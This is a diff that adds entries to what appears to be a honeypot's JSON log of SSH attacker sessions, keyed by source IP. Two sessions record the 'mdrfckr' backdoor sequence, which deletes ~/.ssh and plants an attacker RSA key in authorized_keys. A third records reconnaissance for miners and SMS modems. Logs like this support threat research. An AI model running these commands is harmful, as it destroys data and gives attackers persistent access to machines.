@@ -2181,6 +2181,96 @@
             "session": "27f6f4003e7d"
         }
     ],
+    "129.226.145.89": [
+        {
+            "timestamp": "2023-11-13T18:10:58.205531Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "f12ab2b369ac"
+        },
+        {
+            "timestamp": "2023-11-13T18:10:58.876326Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "f12ab2b369ac"
+        },
+        {
+            "timestamp": "2023-11-13T18:10:59.073874Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "f12ab2b369ac"
+        }
+    ],
+    "103.29.85.13": [
+        {
+            "timestamp": "2023-11-13T18:26:46.776792Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "fffc9d28e5de"
+        },
+        {
+            "timestamp": "2023-11-13T18:26:47.322884Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "fffc9d28e5de"
+        },
+        {
+            "timestamp": "2023-11-13T18:26:47.467084Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "fffc9d28e5de"
+        }
+    ],
+    "221.156.190.181": [
+        {
+            "timestamp": "2023-11-13T19:04:35.305070Z",
+            "event": "command_input",
+            "input": "/ip cloud print",
+            "session": "0541fd2cc026"
+        },
+        {
+            "timestamp": "2023-11-13T19:04:35.765968Z",
+            "event": "command_input",
+            "input": "ifconfig",
+            "session": "0541fd2cc026"
+        },
+        {
+            "timestamp": "2023-11-13T19:04:36.310298Z",
+            "event": "command_input",
+            "input": "uname -a",
+            "session": "0541fd2cc026"
+        },
+        {
+            "timestamp": "2023-11-13T19:04:36.764244Z",
+            "event": "command_input",
+            "input": "cat /proc/cpuinfo",
+            "session": "0541fd2cc026"
+        },
+        {
+            "timestamp": "2023-11-13T19:04:37.327931Z",
+            "event": "command_input",
+            "input": "ps | grep '[Mm]iner'",
+            "session": "0541fd2cc026"
+        },
+        {
+            "timestamp": "2023-11-13T19:04:37.840522Z",
+            "event": "command_input",
+            "input": "ps -ef | grep '[Mm]iner'",
+            "session": "0541fd2cc026"
+        },
+        {
+            "timestamp": "2023-11-13T19:04:38.304277Z",
+            "event": "command_input",
+            "input": "ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+            "session": "0541fd2cc026"
+        },
+        {
+            "timestamp": "2023-11-13T19:04:38.855293Z",
+            "event": "command_input",
+            "input": "echo Hi | cat -n",
+            "session": "0541fd2cc026"
+        }
+    ],
     "189.112.0.11": [
         {
             "timestamp": "2023-11-11T01:06:14.632110Z",
